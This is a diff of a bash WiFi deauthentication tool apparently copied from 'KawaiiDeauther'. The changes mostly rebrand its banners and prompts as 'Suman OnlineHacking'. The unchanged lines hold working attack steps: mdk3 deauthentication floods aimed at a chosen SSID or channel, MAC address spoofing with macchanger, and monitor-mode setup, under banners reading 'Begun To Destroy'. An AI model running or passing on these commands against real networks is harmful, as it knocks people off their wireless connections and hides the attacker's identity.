@@ -24,7 +24,7 @@ BG=$(tput setab 4) # Background Color
 function chk_root () {
 	if [[ "$(id -u)" -ne 0 ]]; then
 		banner
-		printf " ${BD}${WH}[${RD}!${WH}] ${RD}KawaiiDeauther must be run as root ${YW}｡ﾟ･（>﹏<）･ﾟ｡\n"
+		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Suman OnlineHacking must be run as root ${YW}｡ﾟ･（>﹏<）･ﾟ｡\n"
 		exit 1
 	fi
 }
@@ -145,14 +145,14 @@ if [[ $attack == 1 ]]; then
 	banner
 	printf "${NT}\n"
 	nmcli dev wifi
-	echo -ne "\n${RD}4WSec${GR}@${RD}Kawaii: ${WH}>> "; read attck_ssid
+	echo -ne "\n${RD}4WSec${GR}@${RD}Suman: ${WH}>> "; read attck_ssid
 	clear
 	banner
 	get_interface
 	clear
 	banner_2
 	printf "                         ${WH}[ ${GR}Suman OnlineHacking ${WH}]\n"
-	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
+	printf "              ${WH}===== ${RD}(◣_◢) @OnlineHacking (◣_◢) ${WH}=====\n\n"
 	monitor_mode >> /dev/null 2>&1
 	trap deactivate_destruction EXIT ### CTRL+C to exit
 	mdk3 $selected_interface d -n "$attck_ssid"
@@ -166,8 +166,8 @@ elif [[ $attack == 2 ]]; then
 	get_interface
 	clear
 	banner_2
-	printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
-	printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
+	printf "                         ${WH}[ ${GR}Suman Mondal ${WH}]\n"
+	printf "              ${WH}===== ${RD}(◣_◢) @OnlineHacking (◣_◢) ${WH}=====\n\n"
 	monitor_mode >> /dev/null 2>&1
 	trap deactivate_destruction EXIT ### CTRL+C to exit
 	mdk3 $selected_interface d -c $attck_chnl
@@ -185,8 +185,8 @@ elif [[ $attack == 3 ]]; then
 		banner_2
 		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
 		sleep 2
-		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
-		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
+		printf "                         ${WH}[ ${GR}Suman Mondal ${WH}]\n"
+		printf "              ${WH}===== ${RD}(◣_◢) @OnlineHacking (◣_◢) ${WH}=====\n\n"
 		ifconfig $selected_interface down
 		macchanger -r $selected_interface >> /dev/null 2>&1
 		iwconfig $selected_interface mode monitor
@@ -208,8 +208,8 @@ elif [[ $attack == 3 ]]; then
 		banner_2
 		trap deactivate_destruction_2 EXIT ### CTRL+C to exit
 		sleep 2
-		printf "                         ${WH}[ ${GR}Kawaii Deauther ${WH}]\n"
-		printf "              ${WH}===== ${RD}(◣_◢) Begun To Destroy (◣_◢) ${WH}=====\n\n"
+		printf "                         ${WH}[ ${GR}SUMAN ${WH}]\n"
+		printf "              ${WH}===== ${RD}(◣_◢) @OnlineHacking (◣_◢) ${WH}=====\n\n"
 		ifconfig $selected_interface down
 		macchanger -r $selected_interface >> /dev/null 2>&1
 		iwconfig $selected_interface mode monitor
